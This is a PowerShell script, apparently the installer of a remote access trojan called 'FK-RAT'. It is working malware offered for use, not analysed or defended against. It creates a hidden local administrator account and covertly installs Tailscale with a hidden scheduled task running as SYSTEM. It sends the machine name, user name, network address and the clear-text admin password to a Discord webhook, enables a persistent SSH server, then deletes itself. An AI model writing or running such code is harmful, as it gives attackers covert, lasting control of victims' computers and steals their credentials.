## Create random text (8 letters)
function randomText {
  return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}

## Create Local Admin FUNCTION
function createAdmin {
  param (
    [string] $uName,
    [securestring] $pWord
  )
  begin{
  }
  process {
    Remove-LocalUser "$uName"
    New-LocalUser "$uName" -Password $pWord -FullName "$uName" -Description "Temporary local admin"
    Write-Verbose "$uName local user crated"
    Add-LocalGroupMember -Group "$group" -Member "$uName"
    Write-Verbose "$uName added to the local administrator group"
  }
  end{
  }
}

## Installs Trailscale
function installTailscale {
  param ( [string] $path)

  ## CD to Temp
  Set-Location $path

  ## Download and install tailnet
  Invoke-Webrequest -Uri https://pkgs.tailscale.com/stable/tailscale-setup-1.50.1-amd64.msi -OutFile file.msi
  msiexec.exe /a file.msi /quiet
  
  ## Adds Tailscale to task scheduler
  $name = "Tailscale"
  $action = New-ScheduledTaskAction -Execute "C:\Tailscale\tailscaled.exe" 
  $trigger = New-ScheduledTaskTrigger -AtStartup 
  $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highes
  $settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun -AllowStartIfOnBatteries -StartWhenAvailable

  if (Get-ScheduledTask $name -ErrorAction SilentlyContinue) {Unregister-ScheduledTask $name} 
  Register-ScheduledTask -TaskName $name -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Tailscale Service, Preinstalled for Windoes"
}

## Temp Directory
## variables
$temp = "$env:temp"
$dirName = randomText
$pWordClear = randomText
$pWord = (ConvertTo-SecureString  $pWordClear -AsPlainText -Force)
$uName = "fkrat"
$rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
$Webhook = Get-Content ./webhook
$authKey = Get-Content ./authKey
$country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
$country = $country.Substring(0, $country.length - 2)


## Create Admin
createAdmin -uName $uName -pWord $pWord

## Hide FK-RAT User (Admin)
New-Item -Path $rPath -Force
New-ItemProperty -Path $rPath -Name $uName -Value 00000000
timeout 2

## goto Temp and make dir
Set-Location $temp	
New-Item -Path $temp -Name $dirName -Type Directory
Set-Location $dirName

## Install Tailscale and take ip
installTailscale -path $temp/$dirName 
Set-Location $PSScriptRoot
netsh advfirewall firewall add rule name="Tailscale Service"  dir=in action=allow program="C:\Tailscale\tailscaled.exe" enable=yes
Start-Sleep 5

Start-Process -FilePath "C:\Tailscale\tailscaled.exe" -windowstyle hidden -Verb RunAs
Start-Process -FilePath "C:\Tailscale\tailscale-ipn.exe" -windowstyle hidden -Verb RunAs 
Start-Sleep 1
Start-Process -FilePath "C:\Tailscale\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
Start-Sleep 1

## Sends Discord Webhook
$ip = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred -InterfaceAlias "Tailscale").IPAddress 

$description = @"
New Computer 
---------------------------------
Computer Name = $env:computername 
User Name = $env:username
IP = $ip
Account Password = $pwordClear
Temp Directory = $dirName
Location (country) = $country
"@

$payload = @{
  'username' = 'FindersKeepers Keylogger'
  'content'  = $description
}

Invoke-RestMethod -Uri $Webhook -Method Post -Body $payload;

## Enable persistent SSH
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

## Finish Tailscale installation
Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
taskkill /im "tailscale-ipn.exe" /F

## Self Delete
Remove-Item "C:/file.msi"
Remove-Item $temp/$dirName/"file.msi"
Remove-Item "$PSScriptRoot/webhook"
Remove-Item "$PSScriptRoot/authkey"
Remove-Item $PSCommandPath -Force 